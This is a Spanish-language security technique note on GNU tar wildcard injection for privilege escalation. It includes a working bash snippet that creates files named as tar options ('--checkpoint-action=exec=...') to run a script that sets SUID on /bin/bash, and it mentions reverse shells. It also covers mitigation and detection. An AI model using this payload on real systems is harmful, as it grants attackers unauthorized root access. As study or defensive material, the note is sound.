---
topic: Inyección de comodines en tar
tags: [linux, tar, wildcard, privesc, checkpoint]
---

# Inyección de comodines en tar

[🌐 English](tar-wildcard-injection.en.md) | **Español**

## Concepto

Un script privilegiado ejecuta `tar` con `*` dentro de un directorio escribible. Los nombres de archivo que empiezan por `--` se interpretan como opciones, no como rutas. GNU tar permite ejecutar comandos con `--checkpoint-action`.

## Cuándo aplica

- Backups programados por cron, systemd o sudo.
- `tar -czf backup.tar *` o `tar -cf ... ./*`.
- Directorio de trabajo con permisos de escritura para el atacante.

## Procedimiento

1. Localizar el script y confirmar que usa un comodín.
2. Crear archivos con nombres de opción.
3. Esperar el timer o lanzar el script si se permite.
4. Usar una acción que deje un SUID o una reverse shell.

```bash
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/x.sh
chmod +x /tmp/x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh /tmp/x.sh'
```

## Variantes

- `--to-command` en lugar de `--checkpoint-action`.
- `TAR_OPTIONS` manipulable.
- Backups con `find` y `-exec` sobre nombres controlados.

## Limitaciones

- El comodín debe expandirse en el directorio escribible.
- La versión de tar debe soportar la opción.
- El script debe ejecutarse con más privilegios.

## Mitigación y detección

- Usar `--` antes de las rutas y evitar comodines.
- Guardar backups fuera de directorios escribibles.
- Ejecutar backup con un usuario dedicado y sin shell.
- Alertar de archivos llamados `--*` y de `checkpoint-action` en procesos.

## Referencias

- <https://www.gnu.org/software/tar/manual/html_node/checkpoint.html>
- <https://gtfobins.github.io/gtfobins/tar/>
- <https://attack.mitre.org/techniques/T1059/004/>
